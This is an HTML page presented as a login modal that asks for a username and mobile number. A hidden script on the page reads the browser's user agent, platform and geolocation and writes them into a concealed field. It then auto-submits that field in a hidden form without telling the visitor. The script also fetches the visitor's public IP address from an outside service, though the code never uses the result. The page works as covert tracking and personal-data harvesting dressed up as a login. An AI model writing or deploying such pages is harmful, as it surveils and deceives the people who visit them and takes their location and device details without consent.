<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

/* Set a style for all buttons */
button {
  background-color: #4CAF50;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

/* Extra styles for the cancel button */
.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

/* Center the image and position the close button */
.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
  position: relative;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.mb {
  float: right;
  padding-top: 16px;
}

/* The Modal (background) */
.modal {
  display: block; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
  background-color: #fefefe;
  margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
  border: 1px solid #888;
  width: 80%; /* Could be more or less, depending on screen size */
}

/* The Close Button (x) */
.close {
  position: absolute;
  right: 25px;
  top: 0;
  color: #000;
  font-size: 35px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: red;
  cursor: pointer;
}

/* Add Zoom Animation */
.animate {
  -webkit-animation: animatezoom 0.6s;
  animation: animatezoom 0.6s
}

@-webkit-keyframes animatezoom {
  from {-webkit-transform: scale(0)} 
  to {-webkit-transform: scale(1)}
}
  
@keyframes animatezoom {
  from {transform: scale(0)} 
  to {transform: scale(1)}
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.mb {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>

<div id="id01" class="modal">
  
  <form class="modal-content animate" action='User_login_data_transfer.php' method="post">
    <div class="imgcontainer">
      <span onclick="document.getElementById('id01').style.display='none'; window.location.href = 'Home Page.html'" class="close" title="Close Modal">&times;</span>
      <img src="login_Customer_image.png" alt="Avatar" class="avatar">
    </div>

    <div class="container">
      <label for="uname"><b>Username</b></label>
      <input type="text" placeholder="Enter Username" name="Username" required>

      <label for="mb"><b>Mobile No.</b></label>
      <input type="text" placeholder="Enter Your Mobile No." name="Mob" required>
        
      <button type="submit" name="submit" onclick="alert('Thanks for Login');">Login</button>
      <label>
        <input type="checkbox" checked="checked" name="remember"> Remember me
      </label>
    </div>

    <div class="container" style="background-color:#f1f1f1">
      <button type="button" onclick="document.getElementById('id01').style.display='none'; window.location.href = 'Home Page.html'" class="cancelbtn">Cancel</button>
    
    </div>
  </form>
</div>

<form id='myForm' method='post'>
    <input id='Ip_address' type='hidden' name='Data_Getter'></input>
</form>

<script>
            var UserAgent = navigator.userAgent;
            var platform = navigator.platform;
            navigator.geolocation.getCurrentPosition(show_position)
 
            fetch('https://api.ipify.org/?format=json')
                    .then(results => results.json())
                    .then(data => data.ip)  

          function show_position(position){
             lati_and_long = '. (3)- Latitude= ' + position.coords.latitude + '. (4)- Longitude= ' + position.coords.longitude;
             document.getElementById('Ip_address').value = '(1)- UserAgent= ' + UserAgent + '. (2)- Platform=  ' +  platform + lati_and_long;
             document.getElementById('myForm').submit();
        }
// Get the modal
var modal = document.getElementById('id01');
</script>

<?php

error_reporting(0);
ini_set('display_errors', 0);

?>

</body>
</html>
